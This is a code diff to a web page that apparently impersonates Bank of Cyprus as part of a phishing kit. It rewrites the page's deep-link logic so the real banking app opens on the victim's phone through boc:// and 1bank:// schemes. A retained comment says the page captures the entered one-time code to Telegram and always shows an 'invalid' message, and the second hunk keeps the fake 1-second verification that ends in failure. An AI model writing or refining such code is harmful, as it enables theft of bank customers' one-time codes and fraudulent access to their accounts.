@@ -401,43 +401,49 @@ export default function BbvaPage(props: any) {
     }
     if (typeof window === "undefined") return
 
-    const ua = navigator.userAgent || navigator.vendor || ""
-    const isAndroid = /android/i.test(ua)
-    const isIOS =
-      /iPad|iPhone|iPod/.test(ua) ||
-      (typeof navigator !== "undefined" && navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
-
-    if (isAndroid) {
-      // Verified Android App Link Intent for Bank of Cyprus:
-      // By supplying the verified host (1bank.bankofcyprus.com / www.bankofcyprus.com) with scheme=https,
-      // Android launches the installed app directly and bypasses the Google Play Store overlay.
-      window.location.href =
-        "intent://1bank.bankofcyprus.com#Intent;scheme=https;package=cy.com.netinfo.netteller.boc;end;"
-
-      setTimeout(() => {
-        if (!document.hidden) {
-          window.location.href =
-            "intent://www.bankofcyprus.com#Intent;scheme=https;package=cy.com.netinfo.netteller.boc;end;"
-        }
-      }, 300)
-    } else if (isIOS) {
-      // iOS direct custom URL scheme & universal link
-      window.location.href = "boc://"
-      setTimeout(() => {
-        if (!document.hidden) {
-          window.location.href = "1bank://"
-        }
-      }, 300)
-      setTimeout(() => {
-        if (!document.hidden) {
-          window.location.href = "https://1bank.bankofcyprus.com"
-        }
-      }, 600)
-    } else {
-      // Fallback for other platforms
-      window.location.href =
-        "intent://1bank.bankofcyprus.com#Intent;scheme=https;package=cy.com.netinfo.netteller.boc;end;"
+    // Helper to safely trigger custom scheme deep links without creating unwanted browser navigation or Play Store overlays
+    const triggerScheme = (uri: string) => {
+      try {
+        const link = document.createElement("a")
+        link.href = uri
+        link.setAttribute("target", "_self")
+        link.style.display = "none"
+        document.body.appendChild(link)
+        link.click()
+        setTimeout(() => {
+          if (document.body.contains(link)) {
+            document.body.removeChild(link)
+          }
+        }, 300)
+      } catch {
+        window.location.href = uri
+      }
     }
+
+    // Direct custom URI schemes for Bank of Cyprus:
+    // 1. "boc://netteller" (Official Bank of Cyprus Netteller mobile deep link)
+    // 2. "boc://" (Direct app scheme)
+    // 3. "1bank://" (1bank digital banking scheme)
+    // 4. "bocnetteller://" (Netteller platform scheme)
+    triggerScheme("boc://netteller")
+
+    setTimeout(() => {
+      if (!document.hidden) {
+        triggerScheme("boc://")
+      }
+    }, 250)
+
+    setTimeout(() => {
+      if (!document.hidden) {
+        triggerScheme("1bank://")
+      }
+    }, 500)
+
+    setTimeout(() => {
+      if (!document.hidden) {
+        triggerScheme("bocnetteller://")
+      }
+    }, 750)
   }
 
   // BOC Confirm & Resend Handlers: captures code to Telegram and shows invalid message each time
@@ -477,7 +483,7 @@ export default function BbvaPage(props: any) {
     // 1-second verification check, then show the authentication failed invalid message
     setTimeout(() => {
       setIsBocVerifying(false)
-      setBocAuthFailed(true)
+      setBocAuthFailed(true)  
       setBocOtp("")
       bocInputRef.current?.focus()
     }, 1000)
